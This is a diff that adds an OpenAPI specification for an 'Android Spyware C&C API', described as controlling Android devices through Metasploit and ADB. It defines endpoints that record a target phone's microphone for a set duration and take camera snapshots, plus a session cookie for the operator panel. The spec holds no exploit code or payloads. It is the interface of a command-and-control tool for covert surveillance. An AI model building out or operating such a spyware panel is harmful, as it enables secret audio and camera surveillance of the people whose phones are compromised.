@@ -1,0 +1,56 @@
+openapi: 3.0.0
+info:
+  title: Android Spyware C&C API
+  description: API for controlling Android devices via Metasploit and ADB.
+  version: 1.0.0
+servers:
+  - url: http://localhost:3000/
+paths:
+  /admin/recordings/microphone_rec:
+    post:
+      summary: Record Microphone Audio
+      parameters:
+        - name: smartphone_id
+          in: query
+          required: true
+          schema:
+            type: integer
+        - name: time
+          in: query
+          description: Duration in seconds
+          schema:
+            type: integer
+            default: 10
+      responses:
+        '200':
+          description: Recording successful
+          content:
+            text/javascript:
+              schema:
+                type: string
+                description: JS to update UI with player
+  /admin/pictures/take_picture:
+    post:
+      summary: Take Camera Snapshot
+      parameters:
+        - name: smartphone_id
+          in: query
+          required: true
+          schema:
+            type: integer
+        - name: back_camera
+          in: query
+          schema:
+            type: boolean
+            default: true
+      responses:
+        '200':
+          description: Snapshot taken
+components:
+  securitySchemes:
+    cookieAuth:
+      type: apiKey
+      in: cookie
+      name: _android_spyware_session
+security:
+  - cookieAuth: []
